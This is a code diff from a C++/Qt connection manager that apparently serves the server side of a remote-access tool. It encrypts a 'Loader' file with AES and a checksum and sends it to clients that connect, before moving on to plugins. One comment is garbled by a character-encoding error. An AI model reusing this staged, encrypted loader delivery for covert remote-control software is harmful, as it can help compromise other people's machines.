@@ -10,33 +10,6 @@ ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage
     connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
 }
 
-
-/* DELETE
-
-unsigned char c2a2(unsigned char c)
-{
-    if(c<=9)
-    {
-        return c+0x30;
-    }
-    return c-0x0A+'A';
-}
-
-QString bytes2String2(unsigned char* bytes, int len)
-{
-    QString rt;
-    for(int i=0; i<len; i++)
-    {
-        char l = (bytes[i]>>4)&0x0F;
-        char r= bytes[i]&0x0F;
-        QChar c[2] = { c2a2(l),c2a2(r)};
-        rt += QString(c,2);
-    }
-    return QString("0x") + rt;
-}
-
-/* /DELETE */
-
 void ConnectionManager::sendLoader(Connection *connection)
 {
     if(connection->getState()==Connection::JustConnected)
@@ -49,21 +22,21 @@ void ConnectionManager::sendLoader(Connection *connection)
         QByteArray Loader=fileLoader.readAll();
         fileLoader.close();
 
+        /* Añadimos padding CBC */
+        /* FIXME: Hacer que no tenga que calcularse el padding fuera de Crypto::AES() */
+
+        char pad=16-((Loader.size()+4)%16);
+        for(int i=0;i<pad;i++)
+        {
+            Loader.append(pad);
+        }
+
         QByteArray checkSum=Crypto::FNV1a(Loader);
         Loader.insert(0,checkSum);
 
-        QByteArray crypted=Crypto::AES(connection->getIV().data(),connection->getKey(),Loader);
+        QByteArray crypted=Crypto::AES(connection->getIV(),connection->getKey(),Loader);
 
-        /*
-        QString msg;
-        msg+="CheckSum: "+bytes2String2((uchar*)checkSum.data(),4)+"\n";
-        msg+="IV: "+bytes2String2((uchar*)connection->getIV().data(),16);
-
-        QMessageBox::information(0,"Info",msg);
-*/
-
-        connection->write(connection->getIV().data());
-        connection->write(crypted);
+        connection->write(connection->getIV()+crypted);
 
         connection->setState(Connection::WaitingForLoader);
     }
@@ -98,7 +71,7 @@ void ConnectionManager::processHandshake(Connection* connection)
 
     Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;
 
-    //FIXME: Definir númro de puertos correcto
+    //FIXME: Definir nÃºmro de puertos correcto
 #define NUM_PORTS 1
 
     ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(
